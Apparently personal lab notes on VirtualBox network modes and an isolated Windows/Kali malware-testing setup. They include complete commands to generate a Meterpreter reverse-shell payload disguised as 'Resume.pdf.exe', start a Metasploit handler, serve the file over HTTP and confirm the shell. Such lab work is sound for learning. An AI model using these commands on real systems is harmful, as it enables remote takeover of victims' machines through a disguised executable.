Default settings for VM are NAT
- NAT can access the LAN it gives each virtual machine its own network for example
  - Network 1: 10.0.1.0/24
  - Network 2: 10.0.2.0/24
  - Network 3: 10.0.3.0/24

NAT Network
- Gives access to internet but meshes all the virtual boxes into one network

Bridged
- Access to the internet, it connects your VMs like real machines meaning it will be on the same network as your host machine

Host-Only Network
- No internet access nor will it have access to LAN

Internal Network
- Puts the virtual machines into their own network and they will not have access to the LAN

Not attached
- Network adapter is not attached

Next is setting up the virtual machines to stay safe while testing malware
- Went into settings on VirtualBox into network settings and assigned both VMs to internal network under "MyTest"

Setting up network in Windows
- Right click on the network
- Scroll down to change network adapter options
- Right click Ethernet → Properties
- Click Internet Protocol Version 4 (TCP/IPv4)
- Click use the following IP address
- Set IP address to 192.168.20.10
- Go to Command Prompt and type `ipconfig`

Setting up Linux machine
- Right click on ethernet icon
- Wired connection
- Hit gear icon in the bottom left
- Set Method to Manual
- Type in address 192.168.20.11
- Leave netmask as 24
- Open terminal and type `ifconfig`

Pinging the VMs
- First ping was from Kali to Windows — didn't work (Windows firewall was blocking inbound traffic)
- Pinging from Windows to Kali — successful
- Disabled Windows Firewall
- Took a snapshot of both VMs

Using Nmap to find the open port
- `nmap -A 192.168.20.10 -Pn` (scanning Windows system from Kali)
- Found that port `3389/tcp` was open

Creating malware using msfvenom
- Ran command `msfvenom` to view options
- Ran command `msfvenom -l payloads` to list payloads
- Chose payload: `windows/x64/meterpreter_reverse_tcp`
- Full command:
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.20.11 LPORT=4444 -f exe -o Resume.pdf.exe
```
- Ran `ls` to verify the file exists
- Ran `file Resume.pdf.exe` to confirm it's a Windows executable

Starting Metasploit Console
- Command: `msfconsole`
- Used exploit:
```bash
use exploit/multi/handler
```
- Set payload:
```bash
set payload windows/x64/meterpreter_reverse_tcp
```
- Set LHOST:
```bash
set LHOST 192.168.20.11
```
- Verified options using `options`
- Ran `exploit`

Serving the file on Kali
- Ran command:
```bash
python3 -m http.server 9999
```

Downloading on Windows
- In browser, visited: `192.168.20.11:9999`
- Downloaded and ran `Resume.pdf.exe`

Verifying shell connection
- Opened Command Prompt (Admin)
- Ran:
```cmd
netstat -anob
```
- Verified connections:
  - `192.168.20.11:4444` (reverse shell)
  - `192.168.20.11:9999` (web server)
- Opened Task Manager
- Confirmed `Resume.pdf.exe` was running in background
